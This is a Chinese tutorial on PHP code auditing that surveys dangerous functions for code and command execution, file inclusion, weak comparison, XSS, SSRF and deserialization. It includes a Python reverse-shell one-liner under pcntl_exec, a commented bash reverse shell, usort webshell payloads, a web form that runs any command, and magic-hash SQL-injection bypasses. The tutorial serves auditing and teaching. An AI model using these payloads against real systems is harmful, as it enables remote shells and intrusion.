# PHP代码审计基础知识


<!--more-->

{{< admonition info>}}

参考：https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html

{{< /admonition>}}

## 过滤函数

### htmlspecialchars()

`htmlspecialchars() `函数把一些预定义的字符转换为 HTML 实体

预定义的字符：

```
&（和号） 成为&amp;
" （双引号） 成为 &quot;
' （单引号） 成为 &apos;
< （小于） 成为 &lt;
> （大于） 成为 &gt;
```

### addslashes()

`htmlspecialchars()` 函数会在需要转义的字符之前添加反斜线

被转义的字符：

```
单引号（`'`）
双引号（`"`）
反斜线（`\`）
NUL（NUL 字节）
```

### trim() 

`trim() `函数移除字符串两侧的空白字符或其他预定义字符

## 代码执行

### eval() 

`eval()`函数就是将传入的字符串当作 `PHP` 代码来进行执行

PHP5在代码错误格式错误之后仍会执行，而PHP7在代码发生错误之后，那么`eval()`函数就会抛出异常，而不执行之后的代码

```php
<?php
    $code = "echo 'This is a PHP7';";
    eval($code);
?>
# 访问页面输出：This is a PHP7
```

### assert()

`assert()`函数是处理异常的一种形式，相当于一个if条件语句的宏定义一样

```php
<?php
	$code = "system(whoami)";
	assert($code);
?>
# 访问页面爆警告，但不影响输出whoami结果
```

### preg_replace()

`preg_replace(1,2,3)`将在第三个参数中寻找第一个参数，如果存在则替换成第二个参数，参数遵循正则表达式

`preg_replace()`函数在PHP 7 后便不再支持，使用`preg_replace_callback()`进行替换了，取消了不安全的`\e`模式

在PHP 5 的环境中

```php
# \1 用于指定第一个子匹配项
# e eval() 对匹配后的元素执行函数
# i 忽略大小写，匹配不考虑大小写
<?php
   echo preg_replace('/(.*)/ei', '\1', 'phpinfo()');
?>
# 访问页面爆警告，但能成功输出phpinfo
```

### create_function()

`create_function()`用来创建一个匿名函数

`create_function()`函数在内部执行`eval()`函数来执行代码，在PHP 7.2 之后的版本中已经废弃了`create_function()`函数

在PHP 5 的环境中

```php
<?php
    $onefunc = create_function('$a','return system($a);');
	$onefunc(whoami);
?>
# 成功输出whoami结果
```

### array_map()

`array_map()`为数组的每个元素应用回调函数

```php
# 代码示例1
<?php
    $old_array = array(1, 2, 3, 4, 5);
    function func($arg){
        return $arg * $arg;
    }
    $new_array = array_map('func',$old_array);
    var_dump($new_array);
?>
# 执行结果
array(5) {[0]=>int(1) [1]=>int(4) [2]=>int(9) [3]=>int(16) [4]=>int(25)}
# 代码示例2
<?php
    $func = 'system';
    $cmd = 'whoami';
    $old_array[0] = $cmd;
    $new_array = array_map($func,$old_array);
    var_dump($new_array);
?>
# 成功输出whoami结果
```

### call_user_func()

`call_user_func()`是把第一个参数作为回调函数调用

```php
# 代码示例1
<?php
    function callback($a,$b){
        echo $a . "\n";
        echo $b;
    }
    call_user_func('callback','我是参数1','我是参数2');
?>
# 执行结果
我是参数1
我是参数2
# 代码示例2    
<?php
    function callback($a){
        return system($a);
    }
    $cmd = 'whoami';
    call_user_func('callback',$cmd);
?>
# 成功输出whoami结果
```

### call_user_func_array() 

`call_user_func_array() `函数是把一个数组作为回调函数的参数

```php
# 代码示例1
<?php
    function callback($a,$b){
        echo $a . "\n";
        echo $b;
    }
	$onearray = array('我是参数1','我是参数2');
    call_user_func_array('callback',$onearray);
?>
# 执行结果
我是参数1
我是参数2
# 代码示例2  
<?php
    function callback($a){
        return system($a);
    }
    $cmd = array('whoami');
    call_user_func_array('callback',$cmd);
?>
# 成功输出whoami结果
```

### array_filter()

依次将`array`数组中的每个值传到`callback`函数。如果`callback`函数返回`true`，则`array`数组的当前值会被包含在返回的结果数组中。数组的键名保留不变

```php
# 官方示例
<?php
function odd($var)
{
    return($var & 1);
}

function even($var)
{
    return(!($var & 1));
}

$array1 = array("a"=>1, "b"=>2, "c"=>3, "d"=>4, "e"=>5);
$array2 = array(6, 7, 8, 9, 10, 11, 12);

echo "Odd :\n";
print_r(array_filter($array1, "odd"));
echo "Even:\n";
print_r(array_filter($array2, "even"));
?> 
# 执行结果
Odd :Array([a] => 1 [c] => 3 [e] => 5)
Even:Array([0] => 6 [2] => 8 [4] => 10 [6] => 12)
# 代码示例2
<?php
    $cmd='whoami';
    $array1=array($cmd);
    $func ='system';
    array_filter($array1,$func);
?>
# 成功输出whoami结果
```

### usort()

使用用户自定义的比较函数对数组中的值进行排序

```php
usort( array &$array, callable $value_compare_func) : bool
```

参数

- array：输入的数组
- cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数

```php
<?php
    function func($a,$b){
        return ($a<$b)?1:-1;
    }
    $onearray=array(1,3,2,5,9);
    usort($onearray, 'func');
    print_r($onearray);
?>

# 执行结果
Array ( [0] => 9 [1] => 5 [2] => 3 [3] => 2 [4] => 1 )
    
# 把回调函数换成可以代码执行的函数
<?php 
    usort(...$_GET);
?>
# payload: 1.php?1[0]=0&1[1]=eval($_POST['x'])&2=assert
# POST传参: x=phpinfo();
```

### uasort()

`uasort()`函数对数组排序并保持索引和单元之间的关联

```php
# 利用方式与usort()相同
<?php 
    usort(...$_GET);
?>
# payload: 1.php?1[0]=0&1[1]=eval($_POST['x'])&2=assert
# POST传参: x=phpinfo();
```

## 命令执行

### system()

`system()`函数就是执行外部指令，并且显示输出

```php
<?php
    $cmd = 'whoami';
    system($cmd);
?>  
# 成功输出whoami结果
```

### exec()

`exec()`函数和上面`system`函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中

```php
<?php
    $cmd = 'whoami';
    exec($cmd);
?>  
# 成功输出whoami结果
```

### shell_exec() 

`shell_exec() `函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回

如果执行过程中发生错误或者进程不产生输出，那么就返回`NULL`

```php
<?php
	$cmd = 'whoami';
	echo shell_exec($cmd);
?>
# 成功输出whoami结果
```

### `（反撇号）

参考：https://www.cnblogs.com/gaohj/p/3267692.html

shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体

```php
<?php 
    echo `whoami`;
?>
# 成功输出whoami结果
```

### passthru()

执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？

当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代`exec()`或`system()`函数

```php
# 代码示例1
<?php
    passthru('whoami');	//直接将结果返回到页面
?>
# 代码示例2
<?php
    passthru('whoami',$result);	//将结果返回到一个变量，然后通过输出变量值得到输出内容
    echo $result;
?>
```

### pcntl_exec()

参考：https://xz.aliyun.com/t/5320

pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序

版本要求：PHP 4 >= 4.2.0, PHP 5

```php
# 与python结合反弹shell
<?php  pcntl_exec("/usr/bin/python",array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("IP",端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));?>
```

### popen()

参考：https://bbs.huaweicloud.com/blogs/319207

`popen()`函数可以执行系统命令, 但不会输出执行的结果, 而是返回一个资源类型的变量用来存储系统命令的执行结果, 需要配合fread()函数来读取命令的执行结果

```php
$result = popen( 'ls' , 'r' );
# 参数1:字符串类型,需要执行的命令
# 参数2:字符串类型,模式
# 返回值:资源类型,命令执行的结果
echo fread( $result , 100 );
# 参数1:资源类型,需要读取的文件指针
# 参数2:int类型,读取n个字节
# 返回值:字符串类型,读取的文件内容
```

### proc_open()

`proc_open()`函数用法稍显复杂，通常其他函数被过滤时，可以考虑使用此函数

`proc_open()`执行一个命令，并且打开用来输入/输出的文件指针

类似 `popen()`函数， 但是`proc_open()` 提供了更加强大的控制程序执行的能力

```php
# 参考：https://sumygg.com/2015/11/28/executing-command-from-php-and-capturing-output/
# 参考php.net上面的例程，修改了一下写成一个小的php程序，用来测试php执行命令的情况，也可以用来测试服务器上php的环境变量问题
<?php
/**
 * Test executing command from php.
 * reference: http://php.net/manual/zh/function.proc-open.php
 * User: Sumy
 * Date: 2015/11/28 0028
 * Time: 19:57
 */

$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
//  2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
    2 => array("pipe", "w")  // stderr is a pipe that the child will write to
);

$command = isset($_GET["command"]) ? $_GET["command"] : "java -version";
$stdin = isset($_GET["stdin"]) ? $_GET["stdin"] : "";
$cwd = '/tmp';
// $env = array('some_option' => 'aeiou');

$process = proc_open($command, $descriptorspec, $pipes, $cwd, null);

echo "
<form method='get' action='commandtest.php'>
<h1>command</h1>
<input type='text' name='command' value='$command'>
<h1>stdin</h1>
<input type='text' name='stdin' value='$stdin'>
<input type='submit' value='run it!'>
</form>
";

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], $stdin);
    fclose($pipes[0]);

    echo "<h1>stdout</h1>";
    echo "<pre>";
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    echo "</pre>";

    echo "<h1>stderr</h1>";
    echo "<pre>";
    echo stream_get_contents($pipes[2]);
    fclose($pipes[2]);
    echo "</pre>";

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "<h1>command return</h1>";
    echo "<pre>";
    echo "$return_value";
    echo "</pre>";
}
```

## 文件包含

### include()

`include()`将会包含语句并执行指定文件

如果包含文件不存在，报错，但会往下执行

```php
# 代码示例1.php
<?php
	highlight_file(__FILE__);
	$file = $_GET['file']; //远程文件包含需要修改配置，allow_url_include = on，php默认不开启远程文件包含
	include $file;
?
# 代码示例2.php
<?php
	//这里可以使用PHP来反弹shell
	//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i <&3 >&3 2>&3");
	echo '<br><h1>[*]backdoor is running!</h1>';
?>
# payload
1.php?file=2.php
```

### include_once() 

`include_once()`与`include()`没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次

### require()

`require()`的实现和`include()`功能几乎完全相同

区别：如果包含文件不存在，报错，不在执行

### require_once()

相同的文件只包含一次

## 文件读取(下载)

### file_get_contents() 

函数功能是将整个文件读入一个字符串

```php
<?php
    echo file_get_contents('demo.txt');
?>
    
# 执行结果
I am a demo text
```

### fopen()

此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 `@` 来隐藏错误输出

```php
<?php
	$file = fopen("demo.txt","rb");
	$content = fread($file,1024);
	echo $content;
	fclose($file);
?>
# 这段代码中其实也包含了fread的用法。因为fread仅仅只是打开一个文件，要想读取还得需要用到fread来读取文件内容
# 执行结果
I am a demo text
```

### fread()

函数刚才在上个函数中基本已经演示过了，就是读取文件内容

### fgetss()

这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签

```php
<?php
	$file = fopen("demo.html","r");
	echo fgetss($file);
	fclose($file);
?>

# demo.html代码
<h1>I am a demo</h1>
    
# 执行结果
I am a demo
```

### readfile()

此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息

```php
<?php
	echo "<br>" . readfile("demo.txt");
?>
    
# demo.txt
I am a demo:) I am a demo:(
# 执行结果
I am a demo:) I am a demo:(
27
# 我们看到不仅输出了所有内容，而且还输出了总共长度。但是没有输出换行
```

### file()

把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行

```php
<?php
print_r(file("demo.txt"));
?>
    
# 执行结果
Array ( [0] => I am the first line! [1] => I am the second line! )
```

### parse_ini_file()

`parse_ini_file()`功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置

```php
<?php
	print_r(parse_ini_file("demo.ini"));
?>

# demo.ini内容
[names]
me = Robert
you = Peter

[urls]
first = "http://www.example.com"
second = "https://www.runoob.com"

# 执行结果
Array ( [me] => Robert [you] => Peter [first] => http://www.example.com [second] => https://www.runoob.com )
```

### show_source()/highlight_file()

`show_source()/highlight_file()`其作用就是让php代码显示在页面上。这两个没有任何区别，`show_source`其实就是`highlight_file`的别名

## 文件上传

### move_uploaded_file()

此函数是将上传的文件移动到新位置

```php
move_uploaded_file(file,newloc)
```

参数 

- file：必需，规定要移动的文件
- newloc：必需，规定文件的新位置

本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。

如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。

如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。

代码示例：

```php
$fileName = $_SERVER['DOCUMENT_ROOT'].'/uploads/'.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'],$fileName )
```

这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件

## 文件删除

### unlink()

此函数用来删除文件。成功返回 TURE ，失败返回 FALSE

```php
unlink(filename,context)
```

参数

- filename：必需。要删除的文件
- context：可选。句柄环境

我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）

代码示例：

```php
<?php
    $file = "demo.txt";
    if(unlink($file)){
        echo("$file have been deleted");
    }
	else{
        echo("$file not exist?");
    }
?>
```

### session_destroy() 

`session_destroy()`函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie

代码示例：

```php
<?php
// 初始化会话
// 如果要使用会话，别忘了现在就调用：
session_start();

// 重置会话中的所有变量
$_SESSION = array();

// 如果要清理的更彻底，那么同时删除会话 cookie
// 注意：这样不但销毁了会话中的数据，还同时销毁了会话本身
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}

// 最后，销毁会话
session_destroy();
?> 
```

## 变量覆盖 

### extract() 

`函数从数组中将变量提取出来可以覆盖当前符号表中的变量`

该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量

该函数返回成功设置的变量数目

```php
# 代码示例1
<?php
    $color = "blue";
    $one_array = array("color" => "red",
        "size"  => "medium",
        "name" => "dog");
    extract($one_array);
    echo "$color, $size, $name";
?>   
# 执行结果
red, medium, dog

# 代码示例2
<?php
    $name = 'cat';
    extract($_POST);
    echo $name;
?>
# 参时如果我们POST传入name=dog，那么页面将会回显dog
```

### parse_str()

此函数把查询到的字符串解析到变量中

```php
parse_str(string,array)
```

参数

- string：必需。规定要解析的字符串
- array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中

```php
# 代码示例1
<?php
    parse_str("name=Ameng&sex=boy",$a);
    print_r($a);
?>
# 执行结果
Array ( [name] => Ameng [sex] => boy )

# 代码示例2
<?php
	$name = 'who';
    $age = '20';
    parse_str("name=Ameng&age=21");
    echo "$name, $age";
?>
# 执行结果
Ameng, 21
```

变量name和age都发生了变化，被新的值覆盖了。这里用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示

### import_request_variables()

此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用

版本要求：PHP 4 >= 4.1.0，PHP 5 < 5.4.0

```php
bool import_request_variables ( string $types [, string $prefix ] )
```

参数

- types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量
- prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误

代码示例

```php
<?php
    $name = 'who';
	import_request_variables('gp');
	if($name == 'Ameng'){
		echo $name;
	}
	else{
		echo 'You are not Ameng';
	}
?>
```

如果什么变量也不传，那么页面将回显`You are not Ameng`如果通过GET或者POST传入`name=Ameng`那么页面就会回显`Ameng`

### foreach()结合$$

有两种语法：

```php
foreach (array_expression as $value)
    statement
foreach (array_expression as $key => $value)
    statement
```

第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步

第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key

```php
# 代码示例
<?php
    $name = 'who';
    foreach($_GET as $key => $value)	{  
            $$key = $value;  
    }  
    if($name == "Ameng"){
        echo 'You are right!';
    }
	else{
        echo 'You are flase!';
    }
?>
```

当我们直接打开页面的时候它会输出`You are false!`,而当我们通过GET传参`name=Ameng`的时候，它会回显`You are right!`

关键点就在于`$$`这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用`foreach`来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为`$$key`=`$name`，最后赋值为`$value`，从而实现了变量覆盖

## 弱类型比较

### ==和===

**==**：会先进行类型转换，然后进行对比

**===**：会先对类型进行比较，再对数值进行比较

```php
//由0e开头都会被认为是0
$a = "0e1234";
$b = "0e1235";
var_dump($a == $b); //true

var_dump("admin" == 0); //true
var_dump("1admin" == 1); //true
var_dump("admin1" == 1); //false
var_dump("admin1" == 0); //true

$a = "1 and 1=1";
var_dump(in_array($a,array(0,1,2,3,4,5),true)); //false 强比较 ===
var_dump(in_array($a,array(0,1,2,3,4,5))); //true 弱比较
```

### md5()函数和sha1()绕过

PHP 在处理哈希字符串的时候，会使用`!=`或者`==`来对哈希值进行比较，它会把每一个`0E`开头的哈希值都解释为0

如果两个不同的值，经过哈希以后它们都变成了`0E`开头的哈希值，那么 PHP 就会将它们视作相等处理

```php
# MD5加密（0E开头的哈希值）
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

```php
# md5代码示例
<?php
    $a = $_GET['a'];
	$b = $_GET['b'];
	if($a != $b && md5($a) == md5($b)){
        echo '这就是弱类型绕过';
    }
	else{
        echo '再思考一下';
    }
?>
# 从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果

# sha1()代码示例
<?php
    $a = $_GET['a'];
	$b = $_GET['b'];
	if(isset($a,$b)){
		if(sha1($a) === sha1($b)){
			echo 'nice!!!';
		}
		else{
			echo 'Try again!';
		}
	}
?>
# 传入`a[]=1&b[]=2`的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了`nice!!!`，所以可以用数字来绕过`sha1()`函数的比较
```

### is_numeric()绕过

此函数是检测变量是否为数字或者数字字符串

```php
is_numeric( mixed $var) : bool
```

如果`var`是数字或者数字字符串那么就返回TRUE，否则就返回FALSE

```php
<?php
    $a = is_numeric('0x31206f722031');
	if($a){
        echo 'It meets my requirement';
    }
	else{
        echo 'Try again';
    }
?>
# 执行结果
It meets my requirement
```

`0x31206f722031`是`or 1=1`的十六进制，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，就能利用此漏洞实现sql注入

### in_array()绕过

此函数用来检测数组中是否存在某个值

```php
in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool
```

参数 

- needle：带搜索的值(区分大小写)
- haystack：带搜索的数组
- strict：若此参数的值为TRUE，那么`in_array()`函数将会检查needle的类型是否和haystack中的类型相同

```php
<?php
    $myarr = array('Ameng');
	$needle = 0;
	if(in_array($needle,$myarr)){
        echo "It's in array";
    }
	else{
        echo "not in array";
    }
?>
```

从简单的逻辑上分析,0是不存在要搜索的数组中的，理论上，应该是输出`not in array`，但是实际却输出了`It's in array`

原因就在于PHP的默认类型转换

这里我们第三个参数并没有设置为`true`那么默认就是非严格比较，在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。归根到底还是非严格比较导致的问题

所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过

## XSS

### print()

```php
<?php
	$str = $_GET['x'];
	print($str);
?>
```

### print_r()

```php
<?php
	$str = $_GET['x'];
	print_r($str);
?>
```

### echo()

```php
<?php
	$str = $_GET['x'];
	echo "$str";
?>
```

### printf()

```php
<?php
	$str = $_GET['x'];
	printf($str);
?>
```

### sprintf()

```php
<?php
	$str = $_GET['x'];
	$a = sprintf($str);
	echo "$a";
?>
```

### die()

此函数输出一条信息，并退出当前脚本

```php
<?php
	$str = $_GET['x'];
	die($str);
?>
```

### var_dump()

此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构

```php
<?php
	$str = $_GET['x'];
	$a = array($str);
	var_dump($a);
?>
```

### var_export()

此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和`var_dump`类似，不同的是其返回的表示是合法的 PHP 代码

```php
<?php
	$str = $_GET['x'];
	$a = array($str);
	var_export($a);
?>
```

## PHP黑魔法

### md5()

`md5()`函数绕过sql注入

```php
$password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
if(mysqli_num_rows($result)>0){
    echo 'flag is :'.$flag;
}
else{
    echo '密码错误!';
}
```

`md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c`转成字符串为`'or'6xxx`

ffifdyop的MD5加密结果是 276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成'or'6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密

### eval()

在执行命令时，可使用分号构造处多条语句

```php
<?php
	$cmd = "echo 'a';echo '--------------';echo 'b';";
	echo eval($cmd);
?>
```

### ereg()

存在`%00`截断，当遇到使用此函数来进行正则匹配时，我们可以用`%00`来截断正则匹配，从而绕过正则

### curl_setopt() 

存在ssrf漏洞

```php
<?php
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $_GET['Ameng']);
    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_exec($ch);
    curl_close($ch);
?>
# 使用file协议进行任意文件读取
# payload
Ameng=file:///D:/phpstudy_pro/WWW/demo.txt
# 除此之外还有dict协议查看端口信息。gopher协议反弹shell利用等
```

### urldecode()

url二次编码绕过

```php
<?php
	$name = urldecode($_GET['name']);
	if($name == "Ameng"){
		echo "Plase~";
	}
	else{
		echo "sorry";
	}
?>
```

将Ameng进行二次url编码，然后传入即可得到满足条件

### file_get_contents()

常用伪协议来进行绕过

### parse_url()

此函数主要用于绕过某些过滤

在浏览器输入url时，会将url中的\转换为/，从而就会导致`parse_url`的白名单绕过

```php
<?php
	$url = "https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html";
	$parts = parse_url($url);
	print_r($parts);
?>
# 执行结果
Array ( [scheme] => https [host] => wiki.wgpsec.org [path] => /knowledge/code-audit/php-code-audit.html )
```

## 反序列化漏洞

序列化：把对象转换为字节序列的过程成为对象的序列化

反序列化：把字节序列恢复为对象的过程称为对象的反序列化

在 PHP 中主要就是通过`serialize`和`unserialize`来实现数据的序列化和反序列化

```php
<?php
    class Ameng{
    public $who = "Ameng";
	}
	$a = serialize(new Ameng);
	echo $a;
?>
# 执行结果
O:5:"Ameng":1:{s:3:"who";s:5:"Ameng";}
```

这里还要补充一点，就是关于变量的分类，变量的类别有三种：

- public：正常操作，在反序列化时原型就行
- protected：反序列化时在变量名前加上%00*%00
- private：反序列化时在变量名前加上%00类名%00

### __wakeup()

在反序列化时，会先检查类中是否存在`__wakeup()`，如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过`__wakeup()`执行`__destruct()`

影响版本：

PHP5 < 5.6.25
PHP7 < 7.0.10

```php
# 当前目录中需存在2.php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{ 
        public $name='1.php'; 

        function __destruct(){ 
            echo "destruct执行<br>";
            echo highlight_file($this->name, true); 
        } 
        function __wakeup(){ 
            echo "wakeup执行<br>";
            $this->name='1.php'; 
        } 
    }
	$data = 'O:5:"Ameng":2:{s:4:"name";s:5:"2.php";}';
	unserialize($data);
?>
# $data对象属性个数的值大于Ameng真实的属性个数，执行`__destruct()`触发highlight_file(2.php, true)
# 执行结果
destruct执行
`2.php内容`
```

### __sleep()

`__sleep()`函数刚好与`__waeup()`相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{ 
		public $name='1.php'; 
		public function __construct($name){
         $this->name=$name;
    }	
		function __sleep(){
			echo "sleep()执行<br>";
			echo highlight_file($this->name, true);
		}
		function __destruct(){
			echo "over<br>";
		}
         function __wakeup(){ 
            echo "wakeup执行<br>";         
         } 
    }
	$a = new Ameng("2.php");
	$b = serialize($a);
?>
# 执行结果
sleep()执行
`2.php内容`over
```

### __destruct()

在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，可以利用这一点来进行漏洞的利用

### __construct()

在一个对象被创建时会调用这个函数，在`__sleep()`中用这个函数来对变量进行赋值

### __call()

此函数用来监视一个对象中的其他方法，当你尝试调用一个对象中不存在的或者被权限控制的方法，那么`__call`就会被自动调用

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{  
		
		public function __call($name,$args){
			echo "<br>"."call执行失败";
		}
		
		public static function __callStatic($name,$args){
			echo "<br>"."callStatic执行失败";
		}
    }
	$a = new Ameng;
	$a->b();	//触发 __call
	Ameng::b();	//触发 __callStatic
?>
```

### __callStatic()

这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用

倘若这两个函数中有命令执行的函数，那么调用对象中不存在方法时就可以调用这两个函数

### __get()

get方法用来获取私有成员属性的值

```php
//__get()方法用来获取私有属性
public function __get($name){
return $this->$name;
}
```

### __set()

此方法用来给私有成员属性赋值

```php
//__set()方法用来设置私有属性
public function __set($name,$value){
$this->$name = $value;
}
```

### __isset()

当对不可访问属性调用`isset()`或者`empty()`时调用

`isset()`函数检测某个变量是否被设置了，使用这个函数去检测对象里面的成员是否设定，若对象的成员是公有成员，没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，这个时候可以在类里面加上`__isset()`方法，接下来就可以使用`isset()`在对象外面访问对象里面的私有成员了

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{  
		private $name;
		
		public function __construct($name=""){
			$this->name = $name;
		}
		
		public function __isset($content){
			echo "当在类外面调用isset方法时，那么我就会执行！"."<br>";
			echo isset($this->$content);
		}
    }
	$ameng = new Ameng("Ameng");
	echo isset($ameng->name);
?>
```

### __toString()

此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果

通常情况下，我们访问类的属性的时候都是`$实例化名称->属性名`这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用`__tostring()`就可以直接用echo来输出了

```php
<?php
    header("Content-Type: text/html; charset=utf-8");
	class Ameng{
        public $name;
        private $age;
        function __construct($name,$age){
            $this->name = $name;
            $this->age = $age;
        }
        public function __toString(){
            return $this->name . $this->age . '岁了';
        }
    }
	$ameng = new Ameng('Ameng',3);
	echo $ameng;
?>
```

### __invoke()

当尝试以调用函数的方式调用一个对象时，`__invoke()`方法会被自动调用

版本要求：PHP > 5.3.0

```php
<?php
    header("Content-Type: text/html; charset=utf-8");
	class Ameng{
        public $name;
        private $age;
        function __construct($name,$age){
            $this->name = $name;
            $this->age = $age;
        }
        public function __invoke(){
           echo '你用调用函数的方式调用了这个对象，所以我起作用了';
        }
    }
	$ameng = new Ameng('Ameng',3);
	$ameng();
?>
# 执行结果
你用调用函数的方式调用了这个对象，所以我起作用
